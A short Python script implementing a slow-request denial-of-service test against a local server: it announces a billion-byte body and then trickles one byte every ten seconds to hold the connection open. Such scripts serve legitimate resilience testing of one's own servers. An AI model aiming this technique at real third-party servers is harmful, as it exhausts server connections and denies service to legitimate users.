#!/usr/bin/env python3

import socket
import time

def slow_post_request(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(b"GET / HTTP/1.1\r\n")
        s.sendall(b"Host: yourserver.com\r\n")
        s.sendall(b"Content-Length: 1000000000\r\n")
        s.sendall(b"Content-Type: application/x-www-form-urlencoded\r\n\r\n")

        # Send data very slowly
        for i in range(1000000000):
            s.sendall(b"x")
            time.sleep(10)  # Sleep for 10 seconds between each byte

if __name__ == "__main__":
    slow_post_request('localhost', 3030)
